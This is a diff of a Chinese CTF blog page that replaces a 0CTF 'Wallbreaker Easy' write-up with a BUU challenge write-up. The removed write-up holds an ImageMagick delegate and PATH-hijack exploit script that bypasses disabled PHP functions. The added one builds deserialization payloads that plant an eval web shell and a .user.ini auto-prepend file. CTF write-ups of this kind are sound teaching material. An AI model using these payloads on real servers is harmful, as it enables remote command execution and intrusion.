@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="CTF,">
+  <meta name="keywords" content="ctf,">
 
 
 
@@ -79,20 +79,21 @@
 
 
 
-<meta name="description" content="主要参考：https://paper.tuisec.win/detail/d4ba64dd4d1dc38http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easyhttps://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html以及学长的exp：http://mm">
-<meta name="keywords" content="CTF">
+<meta name="description" content="非常感谢赵师傅出的题（赵总nb），这里记录一下解题思路 题目给了源码，很熟悉的代码，和之前高校运维赛的ezpop对比一下  发现多了一步使文件名随机，并且比较了后缀并限制了后缀不能为php 高校运维赛的wp：https://250.ac.cn/2019/11/21/2019-EIS-WriteUp/#ezpop 一开始的想法是后缀绕过，然后去爆破文件名，但是经过尝试，失败 经过尝试可以跨目录，这样">
+<meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="0ctf wallbreaker easy writeup">
-<meta property="og:url" content="http://yoursite.com/2019/04/17/2019-0ctf/index.html">
+<meta property="og:title" content="buu红包题writeup">
+<meta property="og:url" content="http://yoursite.com/2020/01/29/buu-new-year/index.html">
 <meta property="og:site_name" content="Moyu&#39;s blog">
-<meta property="og:description" content="主要参考：https://paper.tuisec.win/detail/d4ba64dd4d1dc38http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easyhttps://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html以及学长的exp：http://mm">
+<meta property="og:description" content="非常感谢赵师傅出的题（赵总nb），这里记录一下解题思路 题目给了源码，很熟悉的代码，和之前高校运维赛的ezpop对比一下  发现多了一步使文件名随机，并且比较了后缀并限制了后缀不能为php 高校运维赛的wp：https://250.ac.cn/2019/11/21/2019-EIS-WriteUp/#ezpop 一开始的想法是后缀绕过，然后去爆破文件名，但是经过尝试，失败 经过尝试可以跨目录，这样">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2019/04/17/2019-0ctf/flag-7.PNG">
-<meta property="og:updated_time" content="2019-09-03T07:10:36.945Z">
+<meta property="og:image" content="http://yoursite.com/2020/01/29/buu-new-year/image-20200129101413584.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/29/buu-new-year/image-20200129104202721.png">
+<meta property="og:updated_time" content="2020-01-29T02:45:27.563Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="0ctf wallbreaker easy writeup">
-<meta name="twitter:description" content="主要参考：https://paper.tuisec.win/detail/d4ba64dd4d1dc38http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easyhttps://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html以及学长的exp：http://mm">
-<meta name="twitter:image" content="http://yoursite.com/2019/04/17/2019-0ctf/flag-7.PNG">
+<meta name="twitter:title" content="buu红包题writeup">
+<meta name="twitter:description" content="非常感谢赵师傅出的题（赵总nb），这里记录一下解题思路 题目给了源码，很熟悉的代码，和之前高校运维赛的ezpop对比一下  发现多了一步使文件名随机，并且比较了后缀并限制了后缀不能为php 高校运维赛的wp：https://250.ac.cn/2019/11/21/2019-EIS-WriteUp/#ezpop 一开始的想法是后缀绕过，然后去爆破文件名，但是经过尝试，失败 经过尝试可以跨目录，这样">
+<meta name="twitter:image" content="http://yoursite.com/2020/01/29/buu-new-year/image-20200129101413584.png">
 
 
 
@@ -122,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/17/2019-0ctf/">
+  <link rel="canonical" href="http://yoursite.com/2020/01/29/buu-new-year/">
 
 
 
 
 
-  <title>0ctf wallbreaker easy writeup | Moyu's blog</title>
+  <title>buu红包题writeup | Moyu's blog</title>
   
 
 
@@ -255,7 +256,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/17/2019-0ctf/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/29/buu-new-year/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Moyu">
@@ -272,7 +273,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">0ctf wallbreaker easy writeup</h1>
+          <h1 class="post-title" itemprop="name headline">buu红包题writeup</h1>
         
 
         <div class="post-meta">
@@ -284,8 +285,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-17T00:00:00+08:00">
-                2019-04-17
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-29T10:08:17+08:00">
+                2020-01-29
               </time>
             
 
@@ -316,7 +317,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  463
+                  351
                 </span>
               
 
@@ -341,10 +342,24 @@
       
 
       
-        <p><strong>主要参考：</strong><br><a href="https://paper.tuisec.win/detail/d4ba64dd4d1dc38" target="_blank" rel="noopener">https://paper.tuisec.win/detail/d4ba64dd4d1dc38</a><br><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy" target="_blank" rel="noopener">http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy</a><br><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a><br>以及学长的exp：<a href="http://mmmmmmlei.cn/" target="_blank" rel="noopener">http://mmmmmmlei.cn/</a><br>这里记录下自己对这道题的思考，非常感谢无私分享的各位大佬<br><strong>主要思路：</strong><br>ImageMagick有一个功能叫做delegate（委托），ImageMagick在解析其不可解析的文件类型时，会尝试调用第三方程序来加载，而调用外部lib的过程是使用系统的system命令来执行的，所以我们需要做的就是用ImageMagick去解析一个无法解析的文件，然后通过putenv去劫持函数<br>exp如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests,sys</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">dir=&quot;/tmp/73896d8f09a8ff21be5e9519fe2a6670&quot; #替换成自己的</span><br><span class="line"></span><br><span class="line">exploit_php = &apos;&apos;&apos;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">Open Basedir: &lt;br&gt;&lt;?php echo ini_get(&apos;open_basedir&apos;);?&gt;&lt;br&gt;</span><br><span class="line">Disable functions: &lt;br&gt;&lt;?php echo ini_get(&apos;disable_functions&apos;); ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$tmp = &quot;%s&quot;;</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;$tmp/1.bmp&quot;, file_get_contents(&quot;http://www.humanesociety.org/sites/default/files/2018/06/cat-217679.jpg&quot;)); #将正常的图片文件写到tmp目录下</span><br><span class="line">$exp = &lt;&lt;&lt;EOF</span><br><span class="line">#!/bin/bash</span><br><span class="line">export PATH=/usr/sbin:/usr/bin:/bin</span><br><span class="line">/readflag &gt; $tmp/data</span><br><span class="line">EOF;#修改路径到系统命令下</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;$tmp/JxrEncApp&quot;, $exp); #ImageMagick无法解析jxr文件，会委托JxrEncApp去帮助解析，我们劫持JxrEncApp就可以执行命令</span><br><span class="line">chmod(&quot;$tmp/JxrEncApp&quot;, 0777); putenv(&quot;PATH=$tmp:/usr/sbin:/usr/bin:/bin&quot;); #配置环境变量</span><br><span class="line">try &#123; </span><br><span class="line">	$a = new Imagick();</span><br><span class="line">    $a-&gt;readImage(&quot;$tmp/1.bmp&quot;); #Imagick可以正常读文件 </span><br><span class="line">    $a-&gt;writeImage(&quot;$tmp/1.jxr&quot;); #Imagick无法解析</span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">	var_dump($e);</span><br><span class="line">&#125;;?&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">Command output:</span><br><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&quot;$tmp/data&quot;); #读flag</span><br><span class="line">?&gt;&lt;/pre&gt;</span><br><span class="line">&apos;&apos;&apos;% dir</span><br><span class="line"></span><br><span class="line">gadget_code = &apos;&apos;&apos;</span><br><span class="line">file_put_contents(&quot;%s/gml&quot;, base64_decode(&quot;%s&quot;));</span><br><span class="line">include &quot;%s/gml&quot;;</span><br><span class="line">unlink(&quot;%s/gml&quot;);&apos;&apos;&apos;% (dir,base64.b64encode(exploit_php),dir,dir)print(requests.post(&quot;http://111.186.63.208:31340&quot;, data=&#123;&apos;backdoor&apos;: gadget_code &#125;).content)</span><br></pre></td></tr></table></figure>
+        <p>非常感谢赵师傅出的题（赵总nb），这里记录一下解题思路</p>
+<p>题目给了源码，很熟悉的代码，和之前高校运维赛的ezpop对比一下</p>
+<p><img src="image-20200129101413584.png" alt="image-20200129101413584"></p>
+<p>发现多了一步使文件名随机，并且比较了后缀并限制了后缀不能为php</p>
+<p>高校运维赛的wp：<a href="https://250.ac.cn/2019/11/21/2019-EIS-WriteUp/#ezpop" target="_blank" rel="noopener">https://250.ac.cn/2019/11/21/2019-EIS-WriteUp/#ezpop</a></p>
+<p>一开始的想法是后缀绕过，然后去爆破文件名，但是经过尝试，失败</p>
+<p>经过尝试可以跨目录，这样就可以不去爆破文件名，用.user.ini去自动加载一个jpg，然后包含shell</p>
+<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
+<p>解题过程如下</p>
+<p>首先传一个包含shell的图片</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">'serialize'</span> =&gt; <span class="string">"base64_decode"</span>, </span><br><span class="line">                      <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">                      <span class="string">'prefix'</span> =&gt; <span class="string">"php://filter/write=convert.base64-decode/resource=uploads/moyu"</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">"/../../aaaaaa.jpg"</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="keyword">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">'qaq'</span>.base64_encode(<span class="string">'&lt;?php @eval($_POST["moyu"]);?&gt;'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
 
-<p>将注释删掉，直接运行即可得到flag<br><img src="flag-7.PNG" alt="flag-7"></p>
+<p>然后上传.user.ini</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">'serialize'</span> =&gt; <span class="string">"base64_decode"</span>, </span><br><span class="line">                      <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">                      <span class="string">'prefix'</span> =&gt; <span class="string">"php://filter/write=convert.base64-decode/resource=uploads/moyu"</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">"/../../.user.ini"</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="keyword">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">'qaq'</span>.base64_encode(<span class="string">"\nauto_prepend_file=aaaaaa.jpg"</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经成功getshell</p>
+<p><img src="image-20200129104202721.png" alt="image-20200129104202721"></p>
+<p>剩下的就是读flag了</p>
 
       
     </div>
@@ -362,7 +377,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
           
         </div>
       
@@ -375,8 +390,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/01/pragyan/" rel="next" title="Pragyan CTF writeup">
-                <i class="fa fa-chevron-left"></i> Pragyan CTF writeup
+              <a href="/2019/10/25/client-session/" rel="next" title="django secret_key泄露导致客户端session伪造">
+                <i class="fa fa-chevron-left"></i> django secret_key泄露导致客户端session伪造
               </a>
             
           </div>
@@ -384,10 +399,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/17/teaser/" rel="prev" title="Teaser CONFidence CTF 2019 web writeup">
-                Teaser CONFidence CTF 2019 web writeup <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
